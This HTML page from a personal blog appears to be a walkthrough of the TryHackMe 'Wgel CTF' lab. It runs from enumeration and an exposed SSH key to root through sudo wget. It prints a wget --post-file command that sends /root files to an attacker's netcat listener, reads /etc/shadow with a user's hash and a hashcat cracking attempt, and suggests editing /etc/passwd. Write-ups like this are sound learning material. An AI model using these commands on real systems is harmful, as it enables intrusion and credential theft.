@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Wgel CTF Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR&#43;idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd| 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK&#43;2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ&#43;jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=| 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt&#43;ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/wgel-ctf/wgel-ctf/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Wgel CTF Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR&#43;idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd| 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK&#43;2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ&#43;jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=| 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt&#43;ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf .">
+
+<meta itemprop="wordCount" content="604"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Wgel CTF Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR&#43;idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd| 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK&#43;2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ&#43;jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=| 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt&#43;ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Wgel CTF Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR&#43;idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd| 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK&#43;2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ&#43;jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=| 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt&#43;ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/wgel-ctf/wgel-ctf/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/wgel-ctf/wgel-ctf/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="wgel-ctf">Wgel CTF</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
+|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
+|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 11374, Words: 3512, Lines: 379]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+sitemap                 [Status: 301, Size: 314, Words: 20, Lines: 10]
+
+
+/sitemap
+
+.ssh                    [Status: 301, Size: 319, Words: 20, Lines: 10]
+css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
+fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10]
+images                  [Status: 301, Size: 321, Words: 20, Lines: 10]
+js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
+</code></pre><p>visit <code>sitemap</code> directory and get to unapp template page</p>
+<p>we fuzz again and in <code>.ssh</code> dir you have an <code>id_rsa</code> key</p>
+<p>we know what to do</p>
+<pre tabindex="0"><code>└──╼ $python2 /usr/share/john/ssh2john.py -w=/usr/share/wordlists/rockyou.txt id_rsa &gt; id_john
+id_rsa has no password!
+</code></pre><p>wait what? I don&rsquo;t even know who to ssh as&hellip;let&rsquo;s go back</p>
+<p>folks you remember how we insist all the time on ALWAYS checking source code?</p>
+<p>It was in <code>/index.html</code>&hellip;yes that default index page for apache servers</p>
+<pre tabindex="0"><code>        &lt;pre&gt;
+/etc/apache2/
+|-- apache2.conf
+|       `--  ports.conf
+|-- mods-enabled
+|       |-- *.load
+|       `-- *.conf
+|-- conf-enabled
+|       `-- *.conf
+|-- sites-enabled
+|       `-- *.conf
+
+
+ &lt;!-- Jessie don&#39;t forget to udate the webiste --&gt;
+          &lt;/pre&gt;
+</code></pre><p>Now we ssh as <code>jessie</code>&hellip;Don&rsquo;t forget to fix permissions on the key</p>
+<pre tabindex="0"><code>└──╼ $chmod 600 id_rsa
+
+└──╼ $ssh jessie@10.10.92.232 -i id_rsa
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+8 packages can be updated.
+8 updates are security updates.
+
+jessie@CorpOne:~$ 
+</code></pre><pre tabindex="0"><code>jessie@CorpOne:~/Documents$ cat user_flag.txt
+jessie_flag_suddenly_appears
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<pre tabindex="0"><code>jessie@CorpOne:~/Documents$ sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+</code></pre><p>wget unh? sounds easy</p>
+<p>Notice how we could probably just <code>su</code> to root if we had jessie&rsquo;s sudo password</p>
+<p>ok gtfobins say we can download root files&hellip;so if the root flag is in the same format as
+user flag we get <code>/root/root_flag.txt</code></p>
+<p>You can use <code>find</code> to confirm that</p>
+<p>set a netcat listener on your side</p>
+<pre tabindex="0"><code>jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.8.226.203:2311
+--2021-11-27 15:27:02--  http://10.8.226.203:2311/
+Connecting to 10.8.226.203:2311... connected.
+HTTP request sent, awaiting response... 
+</code></pre><pre tabindex="0"><code>└──╼ $nc -lnvp 2311
+listening on [any] 2311 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 58212
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.8.226.203:2311
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+root_flag_goes_here
+</code></pre><p>And we got root flag! at this point we could just call it a day&hellip;</p>
+<p>But there is always another possibility</p>
+<p>if we can use <code>wget</code> to read files we might as well read interresting ones</p>
+<p><code>/etc/shadow</code></p>
+<pre tabindex="0"><code>...
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
+sshd:*:18195:0:99999:7:::
+</code></pre><p>ha! jessie&rsquo;s hash! those are crackable!</p>
+<p>looks like sha-512crypt</p>
+<pre tabindex="0"><code>└──╼ $hashcat -m 1800 &#39;$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.&#39; /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+</code></pre><p>well its gonna take too long and I don&rsquo;t have that patience now</p>
+<p>But feel free to explore. What I liked the most about this room was the multiple
+ways to escalate</p>
+<p>By example there is also a possibilty to add a new superuser to <code>/etc/passswd</code></p>
+<p>You download, modify and upload the file&hellip;</p>
+<p>If you are curious enough you will find another way</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
